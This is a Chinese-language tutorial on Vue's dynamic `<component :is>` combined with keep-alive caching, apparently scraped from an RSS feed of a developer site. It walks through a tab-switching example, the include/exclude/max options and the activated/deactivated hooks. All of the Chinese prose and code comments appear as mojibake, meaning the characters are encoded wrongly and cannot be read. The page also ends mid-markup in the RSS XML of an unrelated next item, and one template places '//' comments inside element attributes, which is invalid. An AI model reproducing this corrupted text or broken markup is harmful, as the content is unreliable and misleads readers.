<p>åœ¨Vueå¼€å‘ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸é‡åˆ°ã€Œç»„ä»¶åŠ¨æ€åˆ‡æ¢ã€çš„éœ€æ±‚â€”â€”æ¯”å¦‚æ ‡ç­¾é¡µï¼ˆTabsï¼‰ã€æ­¥éª¤æ¡ã€å¼¹çª—å†…å®¹åˆ‡æ¢ã€è·¯ç”±é¡µé¢ç¼“å­˜ç­‰ã€‚ç›´æ¥ç”¨v-if/v-elseåˆ‡æ¢ç»„ä»¶ï¼Œä¼šé¢‘ç¹é”€æ¯å’Œé‡å»ºç»„ä»¶ï¼Œä¸ä»…æ€§èƒ½æŸè€—å¤§ï¼Œè¿˜ä¼šä¸¢å¤±ç»„ä»¶å†…éƒ¨çŠ¶æ€ï¼ˆæ¯”å¦‚è¾“å…¥æ¡†å†…å®¹ã€æ»šåŠ¨ä½ç½®ï¼‰ã€‚</p>
<p>è€Œ <code>&lt;component :is&gt;</code> æ˜¯Vueå†…ç½®çš„åŠ¨æ€ç»„ä»¶è¯­æ³•ï¼Œä¸“é—¨ç”¨äºå®ç°ç»„ä»¶çµæ´»åˆ‡æ¢ï¼›æ­é… <strong>keep-alive</strong> å†…ç½®ç»„ä»¶ï¼Œå¯ç¼“å­˜åˆ‡æ¢åçš„ç»„ä»¶å®ä¾‹ï¼Œé¿å…é‡å¤æ¸²æŸ“ã€ä¿ç•™ç»„ä»¶çŠ¶æ€ã€‚è¿™å¯¹ç»„åˆæ˜¯Vueæ€§èƒ½ä¼˜åŒ–çš„é«˜é¢‘æ‰‹æ®µï¼Œä¹Ÿæ˜¯é¢è¯•å¿…é—®çš„å®æ“çŸ¥è¯†ç‚¹ã€‚</p>
<p>æ ¸å¿ƒä»·å€¼ï¼šåˆ‡æ¢ç»„ä»¶ä¸é”€æ¯ã€ä¸é‡å»º â†’ æå‡é¡µé¢æ€§èƒ½ï¼›ä¿ç•™ç»„ä»¶çŠ¶æ€ â†’ ä¼˜åŒ–ç”¨æˆ·ä½“éªŒï¼Œä¸¤è€…é…åˆå ªç§°â€œåŠ¨æ€åˆ‡æ¢å¤©èŠ±æ¿â€ã€‚</p>
<h3 data-id="heading-2">äºŒã€æ ¸å¿ƒåŸºç¡€ï¼šå…ˆåƒé€ä¸¤ä¸ªç»„ä»¶çš„å•ç‹¬ç”¨æ³•</h3>
<p>åœ¨å­¦ä¹ ç»„åˆç”¨æ³•å‰ï¼Œå…ˆå¿«é€ŸæŒæ¡å’Œkeep-aliveçš„åŸºç¡€ç”¨æ³•ï¼Œé¿å…æ··æ·†æ ¸å¿ƒé€»è¾‘ï¼Œæ–°æ‰‹ä¹Ÿèƒ½è½»æ¾è·Ÿä¸Šã€‚</p>
<h4 data-id="heading-3">1. åŠ¨æ€ç»„ä»¶  åŸºç¡€ç”¨æ³•</h4>
<p>æ ¸å¿ƒä½œç”¨ï¼šé€šè¿‡:isç»‘å®šçš„å€¼ï¼ŒåŠ¨æ€æ¸²æŸ“ä¸åŒçš„ç»„ä»¶ï¼Œå€¼å¯ä»¥æ˜¯ã€Œç»„ä»¶åã€ã€Œç»„ä»¶é…ç½®å¯¹è±¡ã€æˆ–ã€Œå¼‚æ­¥ç»„ä»¶ã€ï¼Œçµæ´»é€‚é…å„ç±»åˆ‡æ¢åœºæ™¯ã€‚</p>
<p>æœ€ç®€å®æ“ï¼ˆVue3 <code>&lt;script setup&gt;</code> å†™æ³•ï¼Œé¦–é€‰ï¼‰ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">&lt;template&gt;
  &lt;!-- æ ¸å¿ƒï¼š:isç»‘å®šè¦æ¸²æŸ“çš„ç»„ä»¶å --&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">:is</span>=<span class="hljs-string">"currentComponent"</span> /&gt;</span></span>
  
  &lt;!-- åˆ‡æ¢æŒ‰é’®ï¼Œä¿®æ”¹currentComponentçš„å€¼ --&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"currentComponent = 'ComponentA'"</span>&gt;</span>æ˜¾ç¤ºç»„ä»¶A<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"currentComponent = 'ComponentB'"</span>&gt;</span>æ˜¾ç¤ºç»„ä»¶B<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// 1. å¯¼å…¥éœ€è¦åˆ‡æ¢çš„ç»„ä»¶</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ComponentA</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./ComponentA.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ComponentB</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./ComponentB.vue'</span>

<span class="hljs-comment">// 2. ç»‘å®šåŠ¨æ€ç»„ä»¶çš„å˜é‡ï¼ˆåˆå§‹æ¸²æŸ“ComponentAï¼‰</span>
<span class="hljs-keyword">const</span> currentComponent = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'ComponentA'</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<p>å…³é”®æ³¨æ„ç‚¹ï¼š</p>
<ul>
<li>:isç»‘å®šçš„ç»„ä»¶åï¼Œå¿…é¡»å’Œå¯¼å…¥çš„ç»„ä»¶åä¸€è‡´ï¼ˆåŒºåˆ†å¤§å°å†™ï¼ŒVue3é»˜è®¤æ”¯æŒå¤§é©¼å³°ï¼‰ï¼›</li>
<li>è‹¥ç»‘å®šå¼‚æ­¥ç»„ä»¶ï¼Œå¯ç›´æ¥å†™:is="defineAsyncComponent(() =&gt; import('./ComponentA.vue'))"ï¼›</li>
<li>æœªæ­é…keep-aliveæ—¶ï¼Œåˆ‡æ¢ç»„ä»¶ä¼šé”€æ¯å‰ä¸€ä¸ªç»„ä»¶ï¼Œé‡å»ºæ–°ç»„ä»¶ï¼ˆçŠ¶æ€ä¸¢å¤±ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-4">2. ç¼“å­˜ç»„ä»¶ keep-alive åŸºç¡€ç”¨æ³•</h4>
<p>æ ¸å¿ƒä½œç”¨ï¼šç¼“å­˜åŒ…è£¹åœ¨å…¶å†…éƒ¨çš„ç»„ä»¶å®ä¾‹ï¼Œé¿å…ç»„ä»¶è¢«é¢‘ç¹é”€æ¯å’Œé‡å»ºï¼Œä»…åœ¨ç¬¬ä¸€æ¬¡æ¸²æŸ“æ—¶åˆå§‹åŒ–ï¼Œåˆ‡æ¢åä¿ç•™ç»„ä»¶åŸæœ‰çŠ¶æ€ã€‚</p>
<p>æœ€ç®€å®æ“ï¼ˆå•ç‹¬ä½¿ç”¨ï¼Œä»…ç¼“å­˜å•ä¸ªç»„ä»¶ï¼‰ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">&lt;template&gt;
  &lt;!-- åŒ…è£¹éœ€è¦ç¼“å­˜çš„ç»„ä»¶ï¼Œç»„ä»¶åˆ‡æ¢åä¸ä¼šè¢«é”€æ¯ --&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">keep-alive</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ComponentA</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">keep-alive</span>&gt;</span></span>
&lt;/template&gt;
</code></pre>
<p>æ ¸å¿ƒå±æ€§ï¼ˆé‡ç‚¹ï¼Œç»„åˆç”¨æ³•å¿…ç”¨ï¼‰ï¼š</p>
<ul>
<li><strong>include</strong>ï¼šå­—ç¬¦ä¸²/æ•°ç»„ï¼Œä»…ç¼“å­˜æŒ‡å®šåç§°çš„ç»„ä»¶ï¼ˆéœ€åŒ¹é…ç»„ä»¶çš„nameå±æ€§ï¼‰ï¼›</li>
<li><strong>exclude</strong>ï¼šå­—ç¬¦ä¸²/æ•°ç»„ï¼Œä¸ç¼“å­˜æŒ‡å®šåç§°çš„ç»„ä»¶ï¼ˆä¼˜å…ˆçº§é«˜äºincludeï¼‰ï¼›</li>
<li><strong>max</strong>ï¼šæ•°å­—ï¼ŒæŒ‡å®šç¼“å­˜ç»„ä»¶çš„æœ€å¤§å®ä¾‹æ•°ï¼Œè¶…å‡ºåä¼šé”€æ¯æœ€æ—©ç¼“å­˜çš„ç»„ä»¶ï¼ˆé¿å…å†…å­˜æ³„æ¼ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-5">ä¸‰ã€æ ¸å¿ƒå®æ“ï¼š<code>&lt;component :is&gt; + keep-alive</code> ç»„åˆç”¨æ³•ï¼ˆé‡ç‚¹ï¼ï¼‰</h3>
<p>è¿™æ˜¯å®é™…å¼€å‘ä¸­æœ€å¸¸ç”¨çš„å†™æ³•ï¼Œç»“åˆä¸¤è€…ä¼˜åŠ¿ï¼šç”¨å®ç°åŠ¨æ€åˆ‡æ¢ï¼Œç”¨keep-aliveç¼“å­˜åˆ‡æ¢åçš„ç»„ä»¶ï¼Œä¿ç•™çŠ¶æ€+æå‡æ€§èƒ½ï¼Œä»¥ã€Œæ ‡ç­¾é¡µTabsã€ä¸ºç»å…¸æ¡ˆä¾‹ï¼Œä»£ç å¯ç›´æ¥å¤åˆ¶å¥—ç”¨ã€‚</p>
<h4 data-id="heading-6">1. å®Œæ•´æ¡ˆä¾‹ï¼šæ ‡ç­¾é¡µåˆ‡æ¢ï¼ˆç¼“å­˜ç»„ä»¶çŠ¶æ€ï¼‰</h4>
<p>éœ€æ±‚ï¼š3ä¸ªæ ‡ç­¾é¡µï¼Œåˆ‡æ¢æ—¶ä¿ç•™æ¯ä¸ªæ ‡ç­¾é¡µå†…éƒ¨çš„çŠ¶æ€ï¼ˆæ¯”å¦‚è¾“å…¥æ¡†å†…å®¹ï¼‰ï¼Œä¸é‡å¤æ¸²æŸ“ç»„ä»¶ã€‚</p>
<pre><code class="hljs language-ts" lang="ts">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tabs-container"</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- æ ‡ç­¾åˆ‡æ¢æŒ‰é’® --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tabs-header"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
        <span class="hljs-attr">v-for</span>=<span class="hljs-string">"tab in tabs"</span> 
        <span class="hljs-attr">:key</span>=<span class="hljs-string">"tab.name"</span>
        @<span class="hljs-attr">click</span>=<span class="hljs-string">"currentTab = tab.name"</span>
        <span class="hljs-attr">:class</span>=<span class="hljs-string">"{ active: currentTab === tab.name }"</span>
      &gt;</span>
        {{ tab.label }}
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- æ ¸å¿ƒç»„åˆï¼škeep-aliveç¼“å­˜ + component:isåŠ¨æ€åˆ‡æ¢ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">keep-alive</span> 
      <span class="hljs-attr">include</span>=<span class="hljs-string">"Tab1,Tab2,Tab3"</span>  // <span class="hljs-attr">ä»…ç¼“å­˜è¿™3ä¸ªç»„ä»¶</span>ï¼ˆ<span class="hljs-attr">åŒ¹é…ç»„ä»¶name</span>ï¼‰
      <span class="hljs-attr">max</span>=<span class="hljs-string">"3"</span>                   // <span class="hljs-attr">æœ€å¤§ç¼“å­˜3ä¸ªå®ä¾‹</span>ï¼ˆ<span class="hljs-attr">é¿å…å†…å­˜æ³„æ¼</span>ï¼‰
    &gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">:is</span>=<span class="hljs-string">"currentTab"</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">keep-alive</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-comment">// å¯¼å…¥3ä¸ªæ ‡ç­¾é¡µç»„ä»¶</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Tab1</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Tab1.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Tab2</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Tab2.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Tab3</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Tab3.vue'</span>

<span class="hljs-comment">// æ ‡ç­¾é¡µé…ç½®ï¼ˆå…³è”ç»„ä»¶åå’Œæ˜¾ç¤ºæ–‡æœ¬ï¼‰</span>
<span class="hljs-keyword">const</span> tabs = <span class="hljs-title function_">ref</span>([
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Tab1'</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">'æ ‡ç­¾1'</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Tab2'</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">'æ ‡ç­¾2'</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'Tab3'</span>, <span class="hljs-attr">label</span>: <span class="hljs-string">'æ ‡ç­¾3'</span> }
])

<span class="hljs-comment">// å½“å‰æ¿€æ´»çš„æ ‡ç­¾é¡µï¼ˆç»‘å®šåŠ¨æ€ç»„ä»¶ï¼‰</span>
<span class="hljs-keyword">const</span> currentTab = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'Tab1'</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h4 data-id="heading-7">2. å­ç»„ä»¶é…ç½®ï¼ˆå…³é”®ï¼šå¿…é¡»å®šä¹‰nameå±æ€§ï¼‰</h4>
<p>æ³¨æ„ï¼škeep-aliveçš„include/excludeå±æ€§ï¼Œéœ€è¦åŒ¹é…ç»„ä»¶çš„nameå±æ€§æ‰èƒ½ç”Ÿæ•ˆï¼Œå¦åˆ™ç¼“å­˜å¤±è´¥ï¼Œä»¥Tab1.vueä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">&lt;template&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"tab1"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>æ ‡ç­¾1å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- è¾“å…¥æ¡†ï¼šåˆ‡æ¢æ ‡ç­¾åï¼Œè¾“å…¥çš„å†…å®¹ä¼šè¢«ä¿ç•™ï¼ˆç¼“å­˜ç”Ÿæ•ˆï¼‰ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"inputVal"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¯·è¾“å…¥å†…å®¹"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-comment">// å…³é”®ï¼šå®šä¹‰nameå±æ€§ï¼Œä¸keep-aliveçš„includeåŒ¹é…</span>
<span class="hljs-title function_">defineOptions</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Tab1'</span> <span class="hljs-comment">// å¿…é¡»å’Œincludeä¸­çš„å€¼ä¸€è‡´ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰</span>
})

<span class="hljs-keyword">const</span> inputVal = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<p>æç¤ºï¼šTab2ã€Tab3ç»„ä»¶é…ç½®å’ŒTab1ä¸€è‡´ï¼Œä»…éœ€ä¿®æ”¹nameå±æ€§ï¼ˆTab2ã€Tab3ï¼‰å’Œå†…éƒ¨å†…å®¹å³å¯ã€‚</p>
<h4 data-id="heading-8">3. ç»„åˆç”¨æ³•çš„æ ¸å¿ƒé€»è¾‘æ‹†è§£</h4>
<ol>
<li>ç‚¹å‡»æ ‡ç­¾æŒ‰é’®ï¼Œä¿®æ”¹currentTabçš„å€¼ï¼Œé€šè¿‡åˆ‡æ¢æ¸²æŸ“å¯¹åº”çš„ç»„ä»¶ï¼›</li>
<li>keep-aliveé€šè¿‡includeå±æ€§ï¼Œç¼“å­˜Tab1ã€Tab2ã€Tab3ä¸‰ä¸ªç»„ä»¶ï¼Œåˆ‡æ¢æ—¶ä¸ä¼šé”€æ¯å‰ä¸€ä¸ªç»„ä»¶ï¼›</li>
<li>ç»„ä»¶å†…éƒ¨çš„çŠ¶æ€ï¼ˆå¦‚inputValï¼‰ä¼šè¢«ä¿ç•™ï¼Œå†æ¬¡åˆ‡æ¢å›è¯¥æ ‡ç­¾é¡µæ—¶ï¼Œç›´æ¥å¤ç”¨ç¼“å­˜çš„ç»„ä»¶å®ä¾‹ï¼Œæ— éœ€é‡æ–°åˆå§‹åŒ–ã€‚</li>
</ol>
<h3 data-id="heading-9">å››ã€é«˜é¢‘é¿å‘ç‚¹ï¼ˆå¿…çœ‹ï¼ï¼‰</h3>
<h4 data-id="heading-10">å‘ç‚¹1ï¼škeep-aliveç¼“å­˜å¤±æ•ˆï¼Œç»„ä»¶åˆ‡æ¢ä»è¢«é”€æ¯</h4>
<p>å¸¸è§åŸå› åŠè§£å†³æ–¹æ¡ˆï¼š</p>
<ul>
<li>å­ç»„ä»¶æœªå®šä¹‰nameå±æ€§ï¼Œæˆ–nameä¸keep-aliveçš„includeä¸åŒ¹é… â†’ ç»™å­ç»„ä»¶æ·»åŠ defineOptions({ name: 'XXX' })ï¼›</li>
<li>:isç»‘å®šçš„ç»„ä»¶åï¼Œä¸includeä¸­çš„nameä¸ä¸€è‡´ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ â†’ ç»Ÿä¸€ç»„ä»¶åå’Œincludeçš„å€¼ï¼›</li>
<li>keep-aliveåŒ…è£¹äº†éç»„ä»¶å…ƒç´ ï¼ˆå¦‚divï¼‰ â†’ ç¡®ä¿keep-aliveå†…éƒ¨ç›´æ¥åŒ…è£¹æˆ–å•ä¸ªç»„ä»¶ã€‚</li>
</ul>
<h4 data-id="heading-11">å‘ç‚¹2ï¼šç¼“å­˜è¿‡å¤šå¯¼è‡´å†…å­˜æ³„æ¼</h4>
<p>åœºæ™¯ï¼šåŠ¨æ€åˆ‡æ¢çš„ç»„ä»¶æ•°é‡è¾ƒå¤šï¼ˆå¦‚10+ä¸ªï¼‰ï¼Œé•¿æœŸç¼“å­˜ä¼šå ç”¨è¿‡å¤šå†…å­˜ï¼Œå¯¼è‡´é¡µé¢å¡é¡¿ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼šç»™keep-aliveæ·»åŠ maxå±æ€§ï¼Œé™åˆ¶ç¼“å­˜çš„æœ€å¤§å®ä¾‹æ•°ï¼ˆå¦‚max="5"ï¼‰ï¼Œè¶…å‡ºåä¼šè‡ªåŠ¨é”€æ¯æœ€æ—©ç¼“å­˜çš„ç»„ä»¶ã€‚</p>
<h4 data-id="heading-12">å‘ç‚¹3ï¼šéœ€è¦ç¼“å­˜éƒ¨åˆ†ç»„ä»¶ï¼Œæ’é™¤éƒ¨åˆ†ç»„ä»¶</h4>
<p>è§£å†³æ–¹æ¡ˆï¼šç»“åˆincludeå’Œexcludeå±æ€§ï¼Œç²¾å‡†æ§åˆ¶ç¼“å­˜èŒƒå›´ï¼Œç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- ç¼“å­˜Tab1ã€Tab2ï¼Œæ’é™¤Tab3 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">keep-alive</span> <span class="hljs-attr">include</span>=<span class="hljs-string">"Tab1,Tab2"</span> <span class="hljs-attr">exclude</span>=<span class="hljs-string">"Tab3"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">:is</span>=<span class="hljs-string">"currentTab"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">keep-alive</span>&gt;</span>
</code></pre>
<h4 data-id="heading-13">å‘ç‚¹4ï¼šç¼“å­˜åï¼Œç»„ä»¶ç”Ÿå‘½å‘¨æœŸä¸è§¦å‘</h4>
<p>ç°è±¡ï¼šç»„ä»¶è¢«ç¼“å­˜åï¼Œåˆ‡æ¢æ—¶ä¸ä¼šè§¦å‘createdã€mountedç­‰ç”Ÿå‘½å‘¨æœŸé’©å­ï¼ˆå› ä¸ºç»„ä»¶æœªè¢«é”€æ¯å’Œé‡å»ºï¼‰ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨Vueæä¾›çš„<strong>ç¼“å­˜ç”Ÿå‘½å‘¨æœŸé’©å­</strong>ï¼Œæ›¿ä»£ä¼ ç»Ÿç”Ÿå‘½å‘¨æœŸï¼š</p>
<ul>
<li><strong>activated</strong>ï¼šç»„ä»¶è¢«æ¿€æ´»ï¼ˆä»ç¼“å­˜ä¸­å–å‡ºæ˜¾ç¤ºï¼‰æ—¶è§¦å‘ï¼›</li>
<li><strong>deactivated</strong>ï¼šç»„ä»¶è¢«åœç”¨ï¼ˆåˆ‡æ¢éšè—ï¼Œå­˜å…¥ç¼“å­˜ï¼‰æ—¶è§¦å‘ã€‚</li>
</ul>
<pre><code class="hljs language-ts" lang="ts">&lt;script setup&gt;
<span class="hljs-title function_">defineOptions</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'Tab1'</span> })
<span class="hljs-comment">// ç»„ä»¶è¢«æ¿€æ´»æ—¶è§¦å‘ï¼ˆåˆ‡æ¢åˆ°è¯¥æ ‡ç­¾é¡µï¼‰</span>
<span class="hljs-title function_">onActivated</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Tab1è¢«æ¿€æ´»ï¼Œå¯æ‰§è¡Œåˆ·æ–°æ•°æ®ç­‰æ“ä½œ'</span>)
})
<span class="hljs-comment">// ç»„ä»¶è¢«åœç”¨æ—¶è§¦å‘ï¼ˆåˆ‡æ¢åˆ°å…¶ä»–æ ‡ç­¾é¡µï¼‰</span>
<span class="hljs-title function_">onDeactivated</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Tab1è¢«åœç”¨ï¼Œå¯æ‰§è¡Œæ¸…ç†æ“ä½œ'</span>)
})
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-14">äº”ã€æ‰©å±•åœºæ™¯ï¼šç»„åˆç”¨æ³•çš„å®é™…åº”ç”¨</h3>
<p>é™¤äº†æ ‡ç­¾é¡µï¼Œè¿™å¯¹ç»„åˆè¿˜èƒ½é€‚é…ä»¥ä¸‹é«˜é¢‘å¼€å‘åœºæ™¯ï¼Œæ ¸å¿ƒé€»è¾‘å®Œå…¨ä¸€è‡´ï¼Œåªéœ€çµæ´»è°ƒæ•´é…ç½®ï¼š</p>
<h4 data-id="heading-15">1. æ­¥éª¤æ¡ç»„ä»¶ï¼ˆå¤šæ­¥éª¤åˆ‡æ¢ï¼Œä¿ç•™æ¯æ­¥çŠ¶æ€ï¼‰</h4>
<p>æ­¥éª¤æ¡çš„æ¯ä¸€æ­¥å¯¹åº”ä¸€ä¸ªç»„ä»¶ï¼Œåˆ‡æ¢æ­¥éª¤æ—¶ä¿ç•™å½“å‰æ­¥éª¤çš„è¾“å…¥å†…å®¹ã€é€‰æ‹©çŠ¶æ€ï¼Œé¿å…ç”¨æˆ·é‡å¤æ“ä½œï¼Œæå‡ä½“éªŒã€‚</p>
<h4 data-id="heading-16">2. å¼¹çª—å†…å®¹åˆ‡æ¢ï¼ˆç¼“å­˜å¼¹çª—çŠ¶æ€ï¼‰</h4>
<p>å¼¹çª—å†…éœ€è¦åˆ‡æ¢ä¸åŒçš„è¡¨å•ã€è¯¦æƒ…å†…å®¹ï¼Œæ­é…keep-aliveå¯ä¿ç•™è¡¨å•è¾“å…¥çŠ¶æ€ï¼Œé¿å…å¼¹çª—å…³é—­/åˆ‡æ¢æ—¶ä¸¢å¤±å†…å®¹ã€‚</p>
<h4 data-id="heading-17">3. è·¯ç”±é¡µé¢ç¼“å­˜ï¼ˆVue3è·¯ç”±é…åˆkeep-aliveï¼‰</h4>
<p>åœ¨è·¯ç”±è§†å›¾ä¸­ä½¿ç”¨ç»„åˆå†™æ³•ï¼Œç¼“å­˜æŒ‡å®šè·¯ç”±é¡µé¢ï¼Œåˆ‡æ¢è·¯ç”±æ—¶ä¿ç•™é¡µé¢æ»šåŠ¨ä½ç½®ã€è¾“å…¥çŠ¶æ€ï¼ˆå¦‚åˆ—è¡¨é¡µåˆ†é¡µã€æœç´¢æ¡†å†…å®¹ï¼‰ï¼š</p>
<pre><code class="hljs language-ts" lang="ts">&lt;keep-alive include=<span class="hljs-string">"Home,List"</span>&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">router-view</span> /&gt;</span></span> &lt;!-- è·¯ç”±è§†å›¾æœ¬è´¨ä¹Ÿæ˜¯åŠ¨æ€ç»„ä»¶ --&gt;
&lt;/keep-alive&gt;
</code></pre>
<h3 data-id="heading-18">å…­ã€æ€»ç»“ï¼šæ ¸å¿ƒè¦ç‚¹ï¼ˆæ–°æ‰‹å¿…èƒŒï¼‰</h3>
<ol>
<li>ç»„åˆæ ¸å¿ƒï¼š å®ç°åŠ¨æ€åˆ‡æ¢ï¼Œkeep-alive å®ç°ç»„ä»¶ç¼“å­˜ï¼Œä¸¤è€…é…åˆ=çµæ´»åˆ‡æ¢+æ€§èƒ½ä¼˜åŒ–+çŠ¶æ€ä¿ç•™ï¼›</li>
<li>å…³é”®é…ç½®ï¼šå­ç»„ä»¶å¿…é¡»å®šä¹‰nameå±æ€§ï¼Œä¸keep-aliveçš„include/excludeåŒ¹é…ï¼Œå¦åˆ™ç¼“å­˜å¤±æ•ˆï¼›</li>
<li>é¿å‘å…³é”®ï¼šæ·»åŠ maxå±æ€§é™åˆ¶ç¼“å­˜æ•°é‡ï¼Œç”¨activated/deactivatedæ›¿ä»£ä¼ ç»Ÿç”Ÿå‘½å‘¨æœŸï¼›</li>
<li>é€‚ç”¨åœºæ™¯ï¼šæ ‡ç­¾é¡µã€æ­¥éª¤æ¡ã€å¼¹çª—åˆ‡æ¢ã€è·¯ç”±ç¼“å­˜ç­‰æ‰€æœ‰éœ€è¦â€œåˆ‡æ¢ç»„ä»¶å¹¶ä¿ç•™çŠ¶æ€â€çš„åœºæ™¯ã€‚</li>
</ol>
<p>å…¶å®+keep-aliveçš„ç”¨æ³•å¹¶ä¸å¤æ‚ï¼Œæ ¸å¿ƒå°±æ˜¯â€œåˆ‡æ¢â€å’Œâ€œç¼“å­˜â€ä¸¤ä¸ªå…³é”®è¯ã€‚æŒæ¡æœ¬æ–‡çš„å®æ“æ¡ˆä¾‹å’Œé¿å‘ç‚¹ï¼Œå°±èƒ½è½»æ¾åº”å¯¹å„ç±»åŠ¨æ€åˆ‡æ¢åœºæ™¯ï¼Œæ—¢æå‡é¡µé¢æ€§èƒ½ï¼Œåˆä¼˜åŒ–ç”¨æˆ·ä½“éªŒï¼Œé¢è¯•æ—¶ä¹Ÿèƒ½ä»å®¹åº”å¯¹ï½</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½ çŸ¥é“çš„ï¼Œæˆ‘ä»¬ä¸Šåˆæ˜¯ä¸å†™ä»£ç çš„ï¼]]></title>    <link>https://juejin.cn/post/7602465642534404146</link>    <guid>https://juejin.cn/post/7602465642534404146</guid>    <pubDate>2026-02-04T02:23:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602465642534404146" data-draft-id="7602551091515572233" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½ çŸ¥é“çš„ï¼Œæˆ‘ä»¬ä¸Šåˆæ˜¯ä¸å†™ä»£ç çš„ï¼"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯"/> <meta itemprop="datePublished" 